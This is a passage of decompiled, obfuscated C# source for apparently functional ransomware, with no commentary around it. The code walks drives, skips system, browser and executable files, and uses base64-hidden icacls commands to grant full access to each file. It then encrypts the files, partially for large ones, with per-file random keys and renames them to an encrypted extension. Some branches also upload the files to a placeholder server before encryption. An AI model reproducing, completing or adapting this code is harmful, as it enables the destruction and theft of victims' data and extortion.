					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !nMCOBGfKnYn.Contains(array[i].Name))
					{
						nMCOBGfKnYn.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!nMCOBGfKnYn.Contains(string_0[j]))
				{
					nMCOBGfKnYn.Add(string_0[j]);
				}
			}
		}
		if (nMCOBGfKnYn.Contains(oMKRHTBqYRfOk("Qzpc")) && qFDgnyGhwfm == "YES")
		{
			nMCOBGfKnYn.Remove(oMKRHTBqYRfOk("Qzpc"));
		}
		if (HkcjRmtfzgYbbl == "YES")
		{
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate2b == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate2b = delegate
				{
					dpxXqfoOJPmxWa.SqJQCZvGgamgp();
				};
			}
			Thread thread = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegate2b);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
		}
		Parallel.ForEach(nMCOBGfKnYn, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new HKEvdbLCkKIV.NkspxIhkZAcghDC();
			CS_0024_003C_003E8__locals0.PgEGNEZOzoH = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ = string_0;
			if (qsDIrveZaNzAq && !OLRxBoNESYHA().Contains("XP"))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						NHrsaNbqqwFFKh(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (dQHMXFnCEYNSw == "YES")
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					zyEnlTcIHqYR(CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.wvBPXomTVGYyo, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.jhLgXzNXSRNS, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.ZxnwAJqsazOQUB, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.PzYMtvwFVOWwOfS);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				zyEnlTcIHqYR(CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ, CS_0024_003C_003E8__locals0.wvBPXomTVGYyo, CS_0024_003C_003E8__locals0.jhLgXzNXSRNS, CS_0024_003C_003E8__locals0.ZxnwAJqsazOQUB, CS_0024_003C_003E8__locals0.PzYMtvwFVOWwOfS);
			}
		});
	}

	public static void zyEnlTcIHqYR(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (CKQbZpYfqsJAt == "NO")
		{
			if (nsyymqqKpcXoy == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && AamQmrXSkACS(string_0))
			{
				pkuvpdbqQlESF pkuvpdbqQlESF = null;
				try
				{
					pkuvpdbqQlESF = new pkuvpdbqQlESF(string_0.Replace("\\", ""));
				}
				catch
				{
					list = jxPpLMoTLhR(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					vDTDGwOisXmcJ(pkuvpdbqQlESF.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = jxPpLMoTLhR(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = jxPpLMoTLhR(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = idxqNCEhMqUbBAPj.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0389;
					}
				}
				if ((SHnoEunPucmQ == "NO" && !item.EndsWith(text)) || TZzJBVGXhjZB.Contains(item))
				{
					continue;
				}
				if (NvrJrGCLFM == "YES")
				{
					try
					{
						if (mNZEakGpRFrLn.BzymlTUToS(item))
						{
							mNZEakGpRFrLn.yMPBlYJpSCfxjv(item);
						}
					}
					catch
					{
					}
				}
				TZzJBVGXhjZB.Add(item);
				if (!igfzwruhwWDXY.Contains(Path.GetDirectoryName(item)))
				{
					igfzwruhwWDXY.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (YvhlPQrYyPhB == "YES" && fileStream.Length > Convert.ToInt32(XZspBinZvbc) * 1024 * 1024 && !list3.Contains(text))
					{
						if (XiSfijQzOr == "YES")
						{
							foreach (string item2 in HLlzhaBALyehKMW)
							{
								if (item.ToLower().EndsWith(item2) && LNfftKTeaLEJxe == "YES")
								{
									if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && LNfftKTeaLEJxe == "NO")
								{
									try
									{
										BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = luIgktEtlHVR.sjLnWbxhrKF(item, Convert.ToInt32(XZspBinZvbc) * 1024 * 1024);
						byte[] dWszvBlRCViF = luIgktEtlHVR.ZnyJbIPDofh(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						luIgktEtlHVR.SEcBXBtSwKeqJ(item, dWszvBlRCViF);
						if (string_2 != ".*")
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != ".*")
					{
						FKKdtpPOXcixG(item, item + string_2, vzfvEbaMMJjzL);
					}
					else
					{
						FKKdtpPOXcixG(item, item + ".part", vzfvEbaMMJjzL);
					}
				}
				catch (Exception)
				{
				}
				IL_0389:;
			}
		}
	}

	public static void vDTDGwOisXmcJ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		JysbNTrlmOEbMFT.YkvZynJxzmMAMM CS_0024_003C_003E8__locals0 = new JysbNTrlmOEbMFT();
		CS_0024_003C_003E8__locals0.TEsRQlBGMsrM = list_0;
		CS_0024_003C_003E8__locals0.zRrhleDkDu = string_1;
		CS_0024_003C_003E8__locals0.YgvmapaKkT = string_2;
		CS_0024_003C_003E8__locals0.FYndIeNOJJCR = string_3;
		CS_0024_003C_003E8__locals0.BFhdaeESOcRrvA = new List<string> { "" };
		if (SHnoEunPucmQ == "NO")
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.TEsRQlBGMsrM)
				{
					if (!item.ToLower().Contains(":\\program files\\") && !item.ToLower().Contains(":\\windows\\") && !item.ToLower().Contains("perflogs") && !item.ToLower().Contains("internet explorer") && !item.ToLower().Contains(":\\programdata\\") && !item.ToLower().Contains("appdata") && !item.ToLower().Contains("msocache") && !item.ToLower().Contains("system volume information") && !item.ToLower().Contains("boot") && !item.ToLower().Contains("tor browser") && !item.ToLower().Contains("mozilla") && !item.ToLower().Contains("google chrome") && !item.ToLower().Contains("application data") && !item.Contains("autoexec.bat") && !item.Contains("desktop.ini") && !item.Contains("autorun.inf") && !item.Contains("ntuser.dat") && !item.Contains("NTUSER.DAT") && !item.Contains("iconcache.db") && !item.Contains("bootsect.bak") && !item.Contains("boot.ini") && !item.Contains("ntuser.dat.log") && !item.Contains("thumbs.db") && !item.ToLower().Contains("bootmgr") && !item.ToLower().Contains("pagefile.sys") && !item.ToLower().Contains("config.sys") && !item.ToLower().Contains("ntuser.ini") && !item.Contains(oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) && !item.Contains("RSAKeys") && !item.Contains("????????????????????") && !item.EndsWith(CS_0024_003C_003E8__locals0.zRrhleDkDu) && !item.EndsWith("exe") && !item.EndsWith("dll") && !item.EndsWith("EXE") && !item.EndsWith("DLL") && !item.Contains("Recycle.Bin") && !item.Contains(SGHDaCxgQr) && !item.Contains(OpWBXzCwVRYsxq) && !item.Contains(MwUDomDUGsVhYA))
					{
						if (CS_0024_003C_003E8__locals0.YgvmapaKkT.Length != 0)
						{
							string[] ygvmapaKkT2 = CS_0024_003C_003E8__locals0.YgvmapaKkT;
							int num2 = 0;
							while (num2 < ygvmapaKkT2.Length)
							{
								string value2 = ygvmapaKkT2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_08c5;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.zRrhleDkDu))
							{
								goto IL_08c5;
							}
						}
						catch (Exception)
						{
							goto IL_08c5;
						}
						if (item.EndsWith(string_0) && !TZzJBVGXhjZB.Contains(item))
						{
							if (NvrJrGCLFM == "YES")
							{
								try
								{
									if (mNZEakGpRFrLn.BzymlTUToS(item))
									{
										mNZEakGpRFrLn.yMPBlYJpSCfxjv(item);
									}
								}
								catch
								{
								}
							}
							TZzJBVGXhjZB.Add(item);
							if (!igfzwruhwWDXY.Contains(Path.GetDirectoryName(item)))
							{
								igfzwruhwWDXY.Add(Path.GetDirectoryName(item));
							}
							uATAppcKlZ(oMKRHTBqYRfOk("aWNhY2xzLmV4ZQ=="), item + oMKRHTBqYRfOk("IC9ncmFudCBFdmVyeW9uZTpGIC9UIC9DIC9R"));
							eIGoCSnmXvMXP(item);
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_03c4;
									}
									goto end_IL_03c4_2;
									end_IL_03c4:;
								}
								catch (Exception ex12)
								{
									if (vQOhJPfkmenqxsh)
									{
										try
										{
											File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while reading if filesize is zero: " + ex12.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									goto end_IL_03c4_2;
								}
								if (YvhlPQrYyPhB == "YES" && new FileInfo(item).Length > Convert.ToInt32(XZspBinZvbc) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.BFhdaeESOcRrvA.Contains(string_0))
								{
									CS_0024_003C_003E8__locals0 = new JysbNTrlmOEbMFT.mNXDErnWhYhfY();
									CS_0024_003C_003E8__locals0.YSfXkLqrELo = CS_0024_003C_003E8__locals0;
									try
									{
										if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
										{
											File.Move(item, item + CS_0024_003C_003E8__locals0.zRrhleDkDu);
										}
									}
									catch (Exception ex14)
									{
										if (!vQOhJPfkmenqxsh)
										{
											break;
										}
										try
										{
											File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while renaming to crypted extension: " + ex14.Message + "\r\n");
											break;
										}
										catch (Exception)
										{
											break;
										}
									}
									CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv = "";
									if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
									{
										CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv = item + CS_0024_003C_003E8__locals0.zRrhleDkDu;
									}
									else
									{
										CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv = item;
									}
									if (XiSfijQzOr == "YES")
									{
										Thread thread2 = new Thread((ThreadStart)delegate
										{
											foreach (string item2 in HLlzhaBALyehKMW)
											{
												if (CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.YSfXkLqrELo.zRrhleDkDu) && LNfftKTeaLEJxe == "YES")
												{
													if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv).Length)
													{
														try
														{
															BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv);
														}
														catch
														{
														}
													}
												}
												else if (CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv.ToLower().EndsWith(item2) && LNfftKTeaLEJxe == "NO")
												{
													try
													{
														BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv);
													}
													catch
													{
													}
												}
											}
										});
										thread2.Priority = ThreadPriority.Normal;
										thread2.IsBackground = false;
										thread2.Start();
									}
									string text3 = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
									string s3 = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									byte[] array2 = null;
									byte[] byte_2 = luIgktEtlHVR.sjLnWbxhrKF(CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv, Convert.ToInt32(XZspBinZvbc) * 1024 * 1024);
									luIgktEtlHVR.SEcBXBtSwKeqJ(DWszvBlRCViF: (!sWEYqVGQKvAbKzrbA) ? (txjxRPsHuzRR ? luIgktEtlHVR.ZnyJbIPDofh(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : luIgktEtlHVR.ZnyJbIPDofh(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (txjxRPsHuzRR ? rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), YrxPFTOslcV: CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv, KIcXskzpJWslXMph: bytes3);
								}
								else
								{
									string text4 = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
									string s4 = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text4);
									byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
									if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
									{
										if (!kqkNEUMWxoNDeP)
										{
											if (!txjxRPsHuzRR)
											{
												IbxvsuFDJGCHw(item, item + CS_0024_003C_003E8__locals0.zRrhleDkDu, vzfvEbaMMJjzL);
											}
											else
											{
												IbxvsuFDJGCHw(item, item + CS_0024_003C_003E8__locals0.zRrhleDkDu, Encoding.ASCII.GetBytes(text4));
											}
										}
										else
										{
											try
											{
												if (!txjxRPsHuzRR)
												{
													aaxjshgqLTvRmFF(item, item + CS_0024_003C_003E8__locals0.zRrhleDkDu, vzfvEbaMMJjzL);
												}
												else
												{
													aaxjshgqLTvRmFF(item, item + CS_0024_003C_003E8__locals0.zRrhleDkDu, Encoding.ASCII.GetBytes(text4));
												}
											}
											catch (Exception ex16)
											{
												if (vQOhJPfkmenqxsh)
												{
													try
													{
														File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while fully writing to file: " + ex16.Message + "\r\n");
													}
													catch (Exception)
													{
													}
												}
											}
										}
									}
									else if (!kqkNEUMWxoNDeP)
									{
										if (!txjxRPsHuzRR)
										{
											IbxvsuFDJGCHw(item, item + ".part", vzfvEbaMMJjzL);
										}
										else
										{
											IbxvsuFDJGCHw(item, item + ".part", Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!txjxRPsHuzRR)
											{
												aaxjshgqLTvRmFF(item, item, vzfvEbaMMJjzL);
											}
											else
											{
												aaxjshgqLTvRmFF(item, item, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex18)
										{
											if (vQOhJPfkmenqxsh)
											{
												try
												{
													File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while fully writing to file: " + ex18.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
										}
									}
									if (txjxRPsHuzRR)
									{
										if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
										{
											lPoyIxkPQfSfzaP(item + CS_0024_003C_003E8__locals0.zRrhleDkDu, bytes4);
										}
										else
										{
											lPoyIxkPQfSfzaP(item, bytes4);
										}
									}
								}
								goto IL_08c5;
								end_IL_03c4_2:;
							}
							catch (Exception)
							{
								goto IL_08c5;
							}
						}
					}
					continue;
					IL_08c5:
					CS_0024_003C_003E8__locals0.TEsRQlBGMsrM.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.TEsRQlBGMsrM, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new JysbNTrlmOEbMFT.YkvZynJxzmMAMM();
			CS_0024_003C_003E8__locals0.YSfXkLqrELo = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.FGDbrdTLEwF = string_0;
			if (!CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains(":\\program files\\") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains(":\\windows\\") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("perflogs") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("internet explorer") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains(":\\programdata\\") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("appdata") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("msocache") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("system volume information") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("boot") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("tor browser") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("mozilla") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("google chrome") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("application data") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("autoexec.bat") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("desktop.ini") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("autorun.inf") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("ntuser.dat") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("NTUSER.DAT") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("iconcache.db") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("bootsect.bak") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("boot.ini") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("ntuser.dat.log") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("thumbs.db") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("bootmgr") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("pagefile.sys") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("config.sys") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("ntuser.ini") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("RSAKeys") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("????????????????????") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith(CS_0024_003C_003E8__locals0.zRrhleDkDu) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("exe") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("dll") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("EXE") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("DLL") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("Recycle.Bin") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(SGHDaCxgQr) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(OpWBXzCwVRYsxq) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(MwUDomDUGsVhYA))
			{
				if (CS_0024_003C_003E8__locals0.YgvmapaKkT.Length != 0)
				{
					string[] ygvmapaKkT = CS_0024_003C_003E8__locals0.YgvmapaKkT;
					int num = 0;
					while (num < ygvmapaKkT.Length)
					{
						string value = ygvmapaKkT[num];
						if (!CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0a2b;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith(CS_0024_003C_003E8__locals0.zRrhleDkDu))
					{
						goto IL_0a2b;
					}
				}
				catch (Exception)
				{
					goto IL_0a2b;
				}
				if (!TZzJBVGXhjZB.Contains(CS_0024_003C_003E8__locals0.FGDbrdTLEwF))
				{
					if (NvrJrGCLFM == "YES")
					{
						try
						{
							if (mNZEakGpRFrLn.BzymlTUToS(CS_0024_003C_003E8__locals0.FGDbrdTLEwF))
							{
								mNZEakGpRFrLn.yMPBlYJpSCfxjv(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
							}
						}
						catch
						{
						}
					}
					TZzJBVGXhjZB.Add(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
					if (!igfzwruhwWDXY.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FGDbrdTLEwF)))
					{
						igfzwruhwWDXY.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FGDbrdTLEwF));
					}
					eIGoCSnmXvMXP(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.FGDbrdTLEwF).Length != 0L)
							{
								goto end_IL_04c2;
							}
							goto end_IL_04c2_2;
							end_IL_04c2:;
						}
						catch (Exception ex2)
						{
							if (vQOhJPfkmenqxsh)
							{
								try
								{
									File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							goto end_IL_04c2_2;
						}
						if (YvhlPQrYyPhB == "YES" && new FileInfo(CS_0024_003C_003E8__locals0.FGDbrdTLEwF).Length > Convert.ToInt32(XZspBinZvbc) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
								{
									File.Move(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + CS_0024_003C_003E8__locals0.zRrhleDkDu);
								}
							}
							catch (Exception ex4)
							{
								if (vQOhJPfkmenqxsh)
								{
									try
									{
										File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
								return;
							}
							if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
							{
								CS_0024_003C_003E8__locals0.FGDbrdTLEwF += CS_0024_003C_003E8__locals0.zRrhleDkDu;
							}
							if (XiSfijQzOr == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in HLlzhaBALyehKMW)
									{
										if (CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.YSfXkLqrELo.zRrhleDkDu) && LNfftKTeaLEJxe == "YES")
										{
											if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FGDbrdTLEwF).Length)
											{
												try
												{
													BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().EndsWith(item3) && LNfftKTeaLEJxe == "NO")
										{
											try
											{
												BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
							string s = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							byte[] array = null;
							byte[] byte_ = luIgktEtlHVR.sjLnWbxhrKF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, Convert.ToInt32(XZspBinZvbc) * 1024 * 1024);
							luIgktEtlHVR.SEcBXBtSwKeqJ(DWszvBlRCViF: (!sWEYqVGQKvAbKzrbA) ? (txjxRPsHuzRR ? luIgktEtlHVR.ZnyJbIPDofh(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : luIgktEtlHVR.ZnyJbIPDofh(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (txjxRPsHuzRR ? rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), YrxPFTOslcV: CS_0024_003C_003E8__locals0.FGDbrdTLEwF, KIcXskzpJWslXMph: bytes);
						}
						else
						{
							string text2 = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
							string s2 = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
							{
								if (!kqkNEUMWxoNDeP)
								{
									if (!txjxRPsHuzRR)
									{
										IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + CS_0024_003C_003E8__locals0.zRrhleDkDu, vzfvEbaMMJjzL);
									}
									else
									{
										IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + CS_0024_003C_003E8__locals0.zRrhleDkDu, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!txjxRPsHuzRR)
										{
											aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + CS_0024_003C_003E8__locals0.zRrhleDkDu, vzfvEbaMMJjzL);
										}
										else
										{
											aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + CS_0024_003C_003E8__locals0.zRrhleDkDu, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (vQOhJPfkmenqxsh)
										{
											try
											{
												File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while fully writing to file: " + ex6.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
									}
								}
							}
							else if (!kqkNEUMWxoNDeP)
							{
								if (!txjxRPsHuzRR)
								{
									IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + ".part", vzfvEbaMMJjzL);
								}
								else
								{
									IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + ".part", Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!txjxRPsHuzRR)
									{
										aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF, vzfvEbaMMJjzL);
									}
									else
									{
										aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (vQOhJPfkmenqxsh)
									{
										try
										{
											File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while fully writing to file: " + ex8.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
							if (txjxRPsHuzRR)
							{
								if (CS_0024_003C_003E8__locals0.zRrhleDkDu != ".*")
								{
									lPoyIxkPQfSfzaP(CS_0024_003C_003E8__locals0.FGDbrdTLEwF + CS_0024_003C_003E8__locals0.zRrhleDkDu, bytes2);
								}
								else
								{
